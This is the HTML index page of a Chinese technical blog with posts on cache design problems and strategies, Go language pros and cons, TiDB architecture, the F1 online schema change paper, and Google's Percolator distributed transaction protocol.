<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Iggie Wang&#039;s Cyberspace</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Iggie Wang&#039;s Cyberspace"><meta name="msapplication-TileImage" content="/img/dog.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Iggie Wang&#039;s Cyberspace"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Iggie Wang&#039;s Cyberspace"><meta property="og:url" content="https://hey-kong.github.io/"><meta property="og:site_name" content="Iggie Wang&#039;s Cyberspace"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://hey-kong.github.io/img/og_image.png"><meta property="article:author" content="王亮"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://hey-kong.github.io"},"headline":"Iggie Wang's Cyberspace","image":["https://hey-kong.github.io/img/og_image.png"],"author":{"@type":"Person","name":"王亮"},"description":""}</script><link rel="icon" href="/img/dog.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Iggie Wang&#039;s Cyberspace</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/2021/01/16/About-me">About</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-21T08:28:03.000Z" title="2021-2-21 16:28:03">2021-02-21</time>发表</span><span class="level-item"><time dateTime="2021-02-24T13:53:14.672Z" title="2021-2-24 21:53:14">2021-02-24</time>更新</span><span class="level-item">11 分钟读完 (大约1601个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/">缓存设计</a></h1><div class="content"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在设计与开发高性能的系统时，基本都离不开缓存的设计。没有缓存对系统的加速和阻挡大量的请求直接落到系统的底层，系统是很难撑住高并发的冲击。无论是在 CPU 的 L1,L2,L3 缓存，数据库的 sql 语句执行缓存，系统应用的本地缓存，缓存总是解决性能的一把利器。本文主要探讨缓存带来的问题以及缓存方案的设计。</p>
<h2 id="缓存带来的问题"><a href="#缓存带来的问题" class="headerlink" title="缓存带来的问题"></a>缓存带来的问题</h2><h3 id="缓存一致性"><a href="#缓存一致性" class="headerlink" title="缓存一致性"></a>缓存一致性</h3><p>引入缓存后，主要是解决读的性能问题，但是数据总是要更新的，会存在<strong>操作隔离性</strong>和<strong>更新原子性</strong>的问题，是先更新缓存还是先更新数据库呢？</p>
<ul>
<li><p>操作隔离性：一条数据的更新涉及到存储和缓存两套系统，如果多个线程同时操作一条数据，并且没有方案保证多个操作之间的有序执行，就可能会发生更新顺序错乱导致数据不一致的问题</p>
<img src="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/1.png" style="zoom:100%;">
</li>
<li><p>更新原子性：引入缓存后，我们需要保证缓存和存储要么同时更新成功，要么同时更新失败，否则部分更新成功就会导致缓存和存储数据不一致的问题</p>
<img src="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/2.png" style="zoom:100%;">
</li>
</ul>
<ol>
<li>先更新缓存再更新数据库：更新缓存后，后续的读操作都会先从缓存获取从而获取的是最新的数据，但是如果第二步更新数据库失败，那么数据需要回滚，导致先前获取的数据是脏数据来带不可逆的业务影响</li>
<li>先更新数据库后更新缓存：先更新数据库，但是缓存没有更新，再将数据从数据库同步到缓存这一过程中，所有的读操作读的都是旧数据，会带来一定问题，牺牲小概率的一致性</li>
</ol>
<h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p>缓存击穿是指：业务操作访问缓存时，没有访问到数据，又去访问数据库，但是从数据库也没有查询到数据，也不写入缓存，从而导致这些操作每次都需要访问数据库，造成缓存击穿。</p>
<p>解决办法一般有两种：</p>
<ol>
<li>将每次从数据库获取的数据，即使是空值也先写入缓存，但是过期时间设置得比较短，后续的访问都直接从缓存中获取空值返回即可</li>
<li>通过 Bloom filter 记录 key 是否存在，从而避免无效数据的查询</li>
</ol>
<h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>缓存雪崩是指：由于大量的热数据设置了相同或接近的过期时间，导致缓存在某一时刻密集失效，大量请求全部转发到数据库，或者是某个冷数据瞬间涌入大量访问数据库。</p>
<p>主要解决方法：</p>
<ol>
<li>所有数据的过期时间不要设置成一样，防止出现数据批量失效，导致缓存雪崩的情况</li>
<li>采用互斥锁的方式：这里需要使用到分布式锁，在缓存失效后，如果访问同一数据的操作需要访问数据并去更新缓存时，对这些操作都加锁，保证只有一个线程去访问数据并更新缓存，后续所有操作还是从缓存中获取数据，如果一定时间没有获取到就返回默认值或返回空值。这样可以防止数据库压力增大，但是用户体验会降低</li>
<li>后台更新：业务操作需要访问缓存没有获取到数据时，不访问数据库更新缓存，只返回默认值。通过后台线程去更新缓存，这里有两种更新方式：<ul>
<li>启动定时任务定时扫描所有缓存，如果不存在就更新，该方法导致扫描 key 间隔时间过长，数据更新不实时，期间业务操作一直会返回默认值，用户体验比较差</li>
<li>业务线程发现缓存失效后通过消息队列去更新缓存，这里因为是分布式的所以可能有很多条消息，需要考虑消息的幂等性。这种方式依赖消息队列，但是缓存更新及时，用户体验比较好，缺点是系统复杂度增高了</li>
</ul>
</li>
</ol>
<h2 id="缓存方案的设计"><a href="#缓存方案的设计" class="headerlink" title="缓存方案的设计"></a>缓存方案的设计</h2><h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>读数据流程很简单，先去缓存读取数据，如果缓存 MISS，则需要从存储中读取数据，并将数据更新到缓存系统中，整个流程如下所示：</p>
<img src="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/3.png" style="zoom:100%;">

<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>通常选择以下方案，保障数据可靠性，尽量减少数据不一致的出现，通过 TTL 超时机制在一定时间段后自动解决数据不一致现象：</p>
<ol>
<li>更新数据库，保证数据可靠性</li>
<li>更新缓存，有以下 2 个策略：<ul>
<li>惰性更新：删除缓存中对应的 item，等待下次读 MISS 再缓存（推荐）</li>
<li>积极更新：将最新的数据更新到缓存</li>
</ul>
</li>
</ol>
<img src="/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/4.png" style="zoom:100%;">

<h3 id="淘汰"><a href="#淘汰" class="headerlink" title="淘汰"></a>淘汰</h3><p>缓存的作用是将热点数据缓存到内存实现加速，内存的成本要远高于磁盘，因此我们通常仅仅缓存热数据在内存，冷数据需要定期的从内存淘汰，数据的淘汰通常有两种方案：</p>
<ol>
<li>主动淘汰。通过对 Key 设置 TTL 的方式来让 Key 定期淘汰，以保障冷数据不会长久的占有内存（推荐）</li>
<li>被动淘汰。当缓存已用内存超过 Maxmemory 限定时触发淘汰，在 Maxmemory 的场景下缓存的质量是不可控的，因为每次缓存一个 Key 都可能需要去淘汰一个 Key</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ziJ8OFiLA1it3sQvycN7Mg">翻越缓存的三座大山</a></li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-20T13:00:00.000Z" title="2021-2-20 21:00:00">2021-02-20</time>发表</span><span class="level-item"><time dateTime="2021-02-20T14:39:21.105Z" title="2021-2-20 22:39:21">2021-02-20</time>更新</span><span class="level-item">4 分钟读完 (大约528个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/20/Go%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E7%BC%BA%E9%99%B7/">Go语言开发的优势与缺陷</a></h1><div class="content"><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
<li><strong>开发效率高。</strong> Go 非常容易上手，并且容易阅读代码，有丰富的库和内置类型，可以很快写出有价值的代码。</li>
<li><strong>Goroutines 和 Channels。</strong> 天然支持并发，并且轻量，并发编程体验比其他语言更优越。</li>
<li><strong>编译速度快。</strong> 与 Java 和 C++ 等语言相比，Go 飞快的编译速度是其主要生产力。</li>
<li><strong>工具链。</strong> 有许多易于使用的内置工具可以帮助编写可维护和可读的代码，效率大大提高，包括 gofmt 等。它们可以使我们的代码看起来标准化，并且可以简化审查工作。</li>
<li><strong>接口。</strong> 接口可以降低程序之间的耦合度。</li>
<li><strong>if …; … { } 语法。</strong> 可以将变量的作用域限制在 if 语句。</li>
<li><strong>支持GC。</strong> 虽然它的GC并不完美，但它可以满足大多数关于垃圾收集的要求。</li>
<li><strong>支持函数多返回值。</strong> 不需要为了返回多个值而专门定义一个数据结构。</li>
</ul>
<h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><ul>
<li><strong>错误处理。</strong> Go 程序需要函数来返回错误，需要编写大量的 if 块来检查错误并处理它，这使得代码不那么干净，并且可能导致错误跟踪丢失从而缺少有用的错误处理逻辑。</li>
<li><strong>缺少泛型。</strong> 代码会有非常多的重复，除了类型不同之外其他甚至完全一样。</li>
<li><strong>for … range语句会返回一对索引和值。</strong> 要想只获取索引很容易（忽略值就好）；但若要只获取值，则需要显式声明。（这种做法更应该颠倒过来，因为在大多数情况下需要的是值而不是索引）</li>
<li><strong>关键字多余。</strong> 声明一个结构体需要 type 和 struct 两个关键字；声明一个接口需要 type 和 interface 两个关键字。（声明时 type 关键字多余）</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-16T03:53:12.000Z" title="2021-2-16 11:53:12">2021-02-16</time>发表</span><span class="level-item"><time dateTime="2021-02-16T12:18:24.769Z" title="2021-2-16 20:18:24">2021-02-16</time>更新</span><span class="level-item">10 分钟读完 (大约1479个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/">TiDB 架构</a></h1><div class="content"><p>TiDB是支持MySQL语法的开源分布式混合事务/分析处理（HTAP）数据库。TiDB 可以提供水平可扩展性、强一致性和高可用性。它主要由 PingCAP 公司开发和支持，并在 Apache 2.0 下授权。TiDB 从 Google 的 Spanner 和 F1 论文中汲取了最初的设计灵感。</p>
<p>HTAP 是 Hybrid Transactional / Analytical Processing 的缩写。这个词汇在 2014 年由 Gartner 提出。传统意义上，数据库往往专为交易或者分析场景设计，因而数据平台往往需要被切分为 TP 和 AP 两个部分，而数据需要从交易库复制到分析型数据库以便快速响应分析查询。而新型的 HTAP 数据库则可以同时承担交易和分析两种智能，这大大简化了数据平台的建设，也能让用户使用更新鲜的数据进行分析。作为一款优秀的 HTAP 数据数据库，TiDB 除了优异的交易处理能力，也具备了良好的分析能力。</p>
<p>TiDB在整体架构基本是参考 Google Spanner 和 F1 的设计，上分两层为 TiDB 和 TiKV。 TiDB 对应的是 Google F1，是一层无状态的 SQL Layer，兼容绝大多数 MySQL 语法，对外暴露 MySQL 网络协议，负责解析用户的 SQL 语句，生成分布式的 Query Plan，翻译成底层 Key Value 操作发送给 TiKV，TiKV 是真正的存储数据的地方，对应的是 Google Spanner，是一个分布式 Key Value 数据库，支持弹性水平扩展，自动的灾难恢复和故障转移（高可用），以及 ACID 跨行事务。值得一提的是 TiKV 并不像 HBase 或者 BigTable 那样依赖底层的分布式文件系统，在性能和灵活性上能更好，这个对于在线业务来说是非常重要。</p>
<img src="/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/tidb-architecture-1.png" style="zoom:100%;">

<ul>
<li>TiDB Server：SQL 层，对外暴露 MySQL 协议的连接 endpoint，负责接受客户端的连接，执行 SQL 解析和优化，最终生成分布式执行计划。TiDB 层本身是无状态的，实践中可以启动多个 TiDB 实例，通过负载均衡组件（如 LVS、HAProxy 或 F5）对外提供统一的接入地址，客户端的连接可以均匀地分摊在多个 TiDB 实例上以达到负载均衡的效果。TiDB Server 本身并不存储数据，只是解析 SQL，将实际的数据读取请求转发给底层的存储节点 TiKV（或 TiFlash）。</li>
<li>PD (Placement Driver) Server：整个 TiDB 集群的元信息管理模块，负责存储每个 TiKV 节点实时的数据分布情况和集群的整体拓扑结构，提供 TiDB Dashboard 管控界面，并为分布式事务分配事务 ID。PD 不仅存储元信息，同时还会根据 TiKV 节点实时上报的数据分布状态，下发数据调度命令给具体的 TiKV 节点，可以说是整个集群的“大脑”。此外，PD 本身也是由至少 3 个节点构成，拥有高可用的能力。建议部署奇数个 PD 节点。</li>
<li>存储节点<ul>
<li>TiKV Server：负责存储数据，从外部看 TiKV 是一个分布式的提供事务的 Key-Value 存储引擎。存储数据的基本单位是 Region，每个 Region 负责存储一个 Key Range（从 StartKey 到 EndKey 的左闭右开区间）的数据，每个 TiKV 节点会负责多个 Region。TiKV 的 API 在 KV 键值对层面提供对分布式事务的原生支持，默认提供了 SI (Snapshot Isolation) 的隔离级别，这也是 TiDB 在 SQL 层面支持分布式事务的核心。TiDB 的 SQL 层做完 SQL 解析后，会将 SQL 的执行计划转换为对 TiKV API 的实际调用。所以，数据都存储在 TiKV 中。另外，TiKV 中的数据都会自动维护多副本（默认为三副本），天然支持高可用和自动故障转移。</li>
<li>TiFlash：TiFlash 是一类特殊的存储节点。和普通 TiKV 节点不一样的是，在 TiFlash 内部，数据是以列式的形式进行存储，主要的功能是为分析型的场景加速。</li>
</ul>
</li>
</ul>
<p>TiKV 基于 RocksDB，采用了 Raft 协议来实现分布式的一致性。TiKV 的系统架构如下图所示：</p>
<img src="/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/tikv-rocksdb.png" style="zoom:100%;">

<p>优点：</p>
<ul>
<li>纯分布式架构，拥有良好的扩展性，支持弹性的扩缩容</li>
<li>支持 SQL，对外暴露 MySQL 的网络协议，并兼容大多数 MySQL 的语法，在大多数场景下可以直接替换 MySQL</li>
<li>默认支持高可用，在少数副本失效的情况下，数据库本身能够自动进行数据修复和故障转移，对业务透明</li>
<li>支持 ACID 事务，对于一些有强一致需求的场景友好，例如：银行转账</li>
<li>具有丰富的工具链生态，覆盖数据迁移、同步、备份等多种场景</li>
<li>智能的行列混合模式，TiDB 可经由优化器自主选择行列。这套选择的逻辑与选择索引类似：优化器根据统计信息估算读取数据的规模，并对比选择列存与行存访问开销，做出最优选择</li>
</ul>
<p>缺点：</p>
<ul>
<li>虽然兼容MySQL，但是不支持存储过程，触发器，自定义函数，窗口功能有限</li>
<li>不适用数据量小的场景，专门为大数据量设计</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-13T01:00:00.000Z" title="2021-2-13 09:00:00">2021-02-13</time>发表</span><span class="level-item"><time dateTime="2021-02-13T07:29:07.663Z" title="2021-2-13 15:29:07">2021-02-13</time>更新</span><span class="level-item">10 分钟读完 (大约1498个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/">Online, Asynchronous Schema Change in F1</a></h1><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>分布式数据库 Schema 变更时，由于 Server 获取 Schema 元数据的时机不是同步的，不可避免地会使同一时刻一些 Server 上的 Schema 是旧的，如下图所示。而若变更时禁止 DML 让所有的 Server 都暂停服务，对于大规模分布式数据库，基本没法做到，因为 Schema 变更操作需要花费大量时间，而数据库需要保证 24 小时在线。</p>
<img src="/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/1.png" style="zoom:100%;">

<p>例如，增加一个索引 E，Schema 从 S1 变为 S2，有两个节点 A 和 B 分别使用 S1 和 S2：</p>
<ol>
<li>B 添加一行数据，由于它按照 Index E 已经创建完成的 Schema，它会插入两个 KV，RowKV 和 IndexKV</li>
<li>A 删除该行数据，由于它按照 Index E 未创建的 Schema，它只会删除 RowKV，IndexKV 就成了孤儿，破坏了数据的完整性</li>
</ol>
<h2 id="论文思路"><a href="#论文思路" class="headerlink" title="论文思路"></a>论文思路</h2><p>论文提出了一种 Schema 演进的协议，协议有两个特点：</p>
<ol>
<li>Online——Schema 变更期间，所有 Server 仍然可以读写全部数据</li>
<li>Asynchronous——允许不同 Server 在不同时间点开始使用新版本 Schema</li>
</ol>
<p>论文把从 Schema 0 到 Schema 1 的突变，替换为一系列相互兼容的小状态变化：</p>
<ul>
<li>任意两个相邻的小状态（版本）都是兼容的</li>
<li>只有一个 Server 负责 DDL 的执行，其他 Server 只是定期刷新状态（拉取 Schema）</li>
<li>每次 Schema 版本变化间隔不小于一个 Lease 时间，任意时刻，集群中 Server 至多存在两个版本的 Schema。也就是说所有 Server 使用的 Schema 状态都相邻，都是兼容的，经过一系列小状态的转换，就可以实现 Schema 0 到 Schema 1 的变更</li>
</ul>
<h3 id="schema-elements"><a href="#schema-elements" class="headerlink" title="schema elements"></a>schema elements</h3><ul>
<li>包括 tables，columns，indexes，constraints，和 optimistic locks</li>
<li>每个 schema element 都有一个与之关联的 state</li>
</ul>
<h3 id="states"><a href="#states" class="headerlink" title="states"></a>states</h3><img src="/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/2.png" style="zoom:100%;">

<ol>
<li>Absent 状态</li>
</ol>
<ul>
<li>完全不感知该 schema element，任何 DML 都不会涉及该 schema element</li>
</ul>
<ol start="2">
<li>Delete Only 状态</li>
</ol>
<ul>
<li>Select 语句不能使用该 schema element</li>
<li>Delete 语句在删除时，如果​该 schema element​ 对应的条目存在，要一并删除</li>
<li>Insert 语句在插入​时，不允许插入该 schema element​ 对应的条目</li>
<li>Update 语句在修改时，只允许删除既存的该 schema element​ 对应的条目，但不能插入新的该 schema element​ 对应的条目</li>
</ul>
<ol start="3">
<li>Write Only 状态</li>
</ol>
<ul>
<li>Select 语句不能使用该 schema element</li>
<li>其他 DML 语句可以正常使用该 schema element、修改该 schema element​ 对应的条目</li>
</ul>
<ol start="4">
<li>Reorg </li>
</ol>
<ul>
<li>不是一种 schema 状态，而是发生在 write-only 状态之后的一系列操作，保证在索引变为 public 之前所有旧数据的 schema element 都被正确地生成</li>
<li>reorg 要做的就是取到当前时刻的 snapshot，为每条数据补写对应的 schema element 条目即可。当然 reorg 开始之后数据可能发生变更，这种情况下底层 Spanner 提供的一致性能保证 reorg 的写入操作要么失败（说明新数据已提前写入），要么被新数据覆盖</li>
</ul>
<ol start="5">
<li>Public 状态</li>
</ol>
<ul>
<li>该 schema element 正常工作，所有 DML 都正常使用该 schema element</li>
</ul>
<h2 id="状态兼容说明"><a href="#状态兼容说明" class="headerlink" title="状态兼容说明"></a>状态兼容说明</h2><blockquote>
<p>破坏一致性（兼容性）的场景有两种：</p>
<ul>
<li>orphan data anomaly：数据库中包含了按照当前 schema 下不应存在的 KV</li>
<li>integrity anomaly：数据库中缺少当前 schema 下应该存在的 KV</li>
</ul>
</blockquote>
<ol>
<li>为什么 “Absent” 和 “Delete Only” 能够兼容</li>
</ol>
<ul>
<li>Absent 状态的 Server 不知道该 schema element 因此不需要该 schema element，不会产生该 schema element 的条目</li>
<li>Delete Only 状态的 Server 知道该 schema element（非 public）但也不需要该 schema element，不会产生该 schema element 的条目</li>
</ul>
<ol start="2">
<li>为什么 “Delete Only” 和 “Write Only” 能够兼容</li>
</ol>
<ul>
<li>Delete Only 状态和 Write Only 状态的 Server 都知道该 schema element（非 public）但都不需要该 schema element</li>
</ul>
<ol start="3">
<li>为什么 “Write Only” 和 “Public” 能够兼容</li>
</ol>
<ul>
<li>Write Only 状态的 Server 在该 schema element 的所有已经完整的情况下（通过 Reorg），可以与 Public 兼容</li>
</ul>
<ol start="4">
<li>为什么 “Absent” 和 “Write Only” 不兼容</li>
</ol>
<ul>
<li>因为 Write Only 会产生新的条目，破坏了 Absent 的条件</li>
</ul>
<ol start="5">
<li>为什么 “Delete Only” 和 “Public” 不兼容</li>
</ol>
<ul>
<li>因为 Public 有要求所有历史数据有完整的 schema element，Delete Only 状态下并不具备</li>
</ul>
<ol start="6">
<li>通俗点举例</li>
</ol>
<ul>
<li>假设在增加一个索引 E 的过程中，有如下执行顺序：1）Server A 插入一行 x；2) Server B 删除了行 x；3）Server A 查询 y；4) Server B 查询 y：<br>  (1) A 为 Delete Only 状态，B 为 Absent 状态：A 插入了一个 KV（RowKV），B 将 RowKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的<br>  (2) A 为 Write Only 状态，B 为 Delete Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的<br>  (3) A 为 Public 状态，B 为 Write Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除；查询时，A 会用到 Index E，B 虽然不会用到 Index E，但数据库中存在 A 的 schema 下应该存在的 IndexKV，所以是兼容的<br>  (4) A 为 Write Only 状态，B 为 Absent 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 感知不到 IndexKV，因此只会删除 RowKV，这一行的 IndexKV 就成了孤儿数据，所以不兼容<br>  (5) A 为 Public 状态，B 为 Delete Only 状态：A 会用到 Index E，B 不会用到 Index E，并且数据库中也不存在 A 的 schema 下的 IndexKV，所以不兼容</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Ian Rae, Eric Rollins, Jeff Shute, Sukhdeep Sodhi and Radek Vingralek, Online, Asynchronous Schema Change in F1, VLDB 2013.</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-08T16:00:00.000Z" title="2021-2-9 00:00:00">2021-02-09</time>发表</span><span class="level-item"><time dateTime="2021-02-08T19:48:00.033Z" title="2021-2-9 03:48:00">2021-02-09</time>更新</span><span class="level-item">14 分钟读完 (大约2065个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/09/Google-Percolator/">Google Percolator</a></h1><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Percolator 事务模型是 Google 内部用于 Web 索引更新的业务提出的分布式事务协议，构建在 BigTable 之上，总体来说就是一个经过优化的二阶段提交的实现。使用基于 Percolator 的增量处理系统代替原有的批处理索引系统后，Google 在处理同样数据量的文档时，将文档的平均搜索延时降低了50%。</p>
<h2 id="2PC"><a href="#2PC" class="headerlink" title="2PC"></a>2PC</h2><p>传统的 2PC 简单描述一下就是两步：</p>
<ol>
<li>发起事务：事务管理器会发出 Prepare 请求，要求参与者记录日志，进行资源的检查和锁定</li>
<li>确认/取消事务：当请求得到所有参与者的成功确认后，事务管理器会发出 Commit 请求，执行真正的操作；如果第一步中只要有一个执行者返回失败，则取消事务</li>
</ol>
<p>这样会有两个问题，一个就是<strong>单点故障</strong>：如果事务管理器发生故障，数据库会一直阻塞下去。尤其是在第二阶段发生故障的话，所有参与者还都处于锁定事务资源的状态中，从而无法继续完成事务操作；另一个就是存在<strong>数据不一致</strong>的情况：在第二阶段，当事务管理器向参与者发送 Commit 请求之后，发生了局部网络异常，导致只有部分参与者接收到请求，但是其他参与者未接到请求所以无法提交事务，整个系统就会出现数据不一致性的现象。</p>
<h2 id="Percolator-事务流程"><a href="#Percolator-事务流程" class="headerlink" title="Percolator 事务流程"></a>Percolator 事务流程</h2><p>Percolator 事务是一个经过优化的 2PC 的实现，进行了一个二级锁的优化，也分为两个阶段：预写（Pre-write）和提交（Commit）。另外，所有启用了 Percolator 事务的表中，每一个 Column Family 都会预先增加两个列，分别是：</p>
<ul>
<li>lock：存储事务过程中的锁信息</li>
<li>write：存储当前行可见（最近一次提交）的版本号</li>
</ul>
<p>另外，为了简化场景，假设存储用户数据的列只有一个，名为 data。</p>
<h2 id="Pre-write"><a href="#Pre-write" class="headerlink" title="Pre-write"></a>Pre-write</h2><ol>
<li><p>客户端从 TSO 获取时间戳，记为 start_ts，并向 Percolator Worker 发起 Pre-write 请求。</p>
</li>
<li><p>在该事务包含的所有写操作中选取一个作为主（primary）操作，其余的作为次（secondary）操作。主操作将作为整个事务的互斥点，标记事务的状态。</p>
</li>
<li><p>先预写主操作，成功后再预写次操作。在预写过程中，对每一个写操作都要执行检查：</p>
<ul>
<li>检查写入的行对应的 lock 列是否有锁，如果有，说明其他事务正在写，直接取消整个事务</li>
<li>检查写入的行对应的 write 列版本号是否晚于 start_ts，如果是，说明有版本冲突，直接取消整个事务</li>
</ul>
</li>
<li><p>检查通过后，以 start_ts 作为版本号将数据写入 data 列，对操作行加锁，即更新 lock 列的锁信息：主操作行的 lock 直接标为primary，次操作行的 lock 则标为主操作行的键和列名。不更新write列，亦即此时写入的数据仍然不可见。</p>
</li>
</ol>
<h2 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h2><ol>
<li><p>客户端从 TSO 获取时间戳，记为 commit_ts，并向 Percolator Worker 发起 Commit 请求。</p>
</li>
<li><p>检查主操作行对应的 lock 列所在的 primary 标记是否存在，如果不存在则失败，取消事务；如果存在则继续。</p>
</li>
<li><p>以 commit_ts 作为版本号，将 start_ts 更新到 write 列中。也就是说在本阶段完成后，预写阶段写入的数据将会可见。</p>
</li>
<li><p>对该行解锁，即删除 lock 列的 primary 信息。</p>
</li>
<li><p>若步骤 1~4 均成功，说明主操作行成功，代表整个事务实际上已经提交。接下来更新每个 secondary 即可，即重复步骤3、4的更新 write 列和清除 lock 列操作。secondary 的 commit 是可以异步进行的，只是在异步提交进行的过程中，如果此时有读请求，可能会需要做一下锁的清理工作。</p>
</li>
</ol>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>银行转账，Bob 向 Joe 转账 7 元。该事务于 start_ts=7 开始，commit_ts=8 结束，Key 为 Bob 和 Joe 的行可能在不同的分片上。具体过程如下：</p>
<ol>
<li>首先查询 write 列获取最新时间戳数据，获取到 data@5，然后从 data 列里面获取时间戳为 5 的数据，初始状态下，Bob 的帐户下有 10，Joe 的帐户下有 2。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/1.png" style="zoom:100%;">

<ol start="2">
<li>事务开始，获取 start_ts=7 作为当前事务的开始时间戳，将 Bob 行选为本事务的 primary，通过写入 lock 列锁定 Bob 的帐户，同时将数据 7:$3 写入到 data 列。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/2.png" style="zoom:100%;">

<ol start="3">
<li>同样，使用 start_ts=7，将 Joe 改变后的余额写入到 data 列，当前操作作为 secondary，因此在 lock 列写入 7:<a href="mailto:&#x50;&#x72;&#x69;&#109;&#x61;&#114;&#x79;&#x40;&#x42;&#111;&#x62;&#x2e;&#x62;&#x61;&#x6c;">&#x50;&#x72;&#x69;&#109;&#x61;&#114;&#x79;&#x40;&#x42;&#111;&#x62;&#x2e;&#x62;&#x61;&#x6c;</a>（当失败时，能够快速定位到 primary 操作，并根据其状态异步清理）。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/3.png" style="zoom:100%;">

<ol start="4">
<li>事务带着当前时间戳 commit_ts=8 进入 Commit 阶段：删除 primary 所在的 lock，并在 write 列中写入以提交时间戳作为版本号指向数据存储的一个指针 data@7。至此，读请求过来时将看到 Bob 的余额为 3。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/4.png" style="zoom:100%;">

<ol start="5">
<li>同样，使用 commit_ts=8，依次在 secondary 操作项中写入 write 列并清理锁。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/5.png" style="zoom:100%;">

<ol start="6">
<li>至此，整个当前 Percolator 事务已完成。</li>
</ol>
<img src="/2021/02/09/Google-Percolator/6.png" style="zoom:100%;">

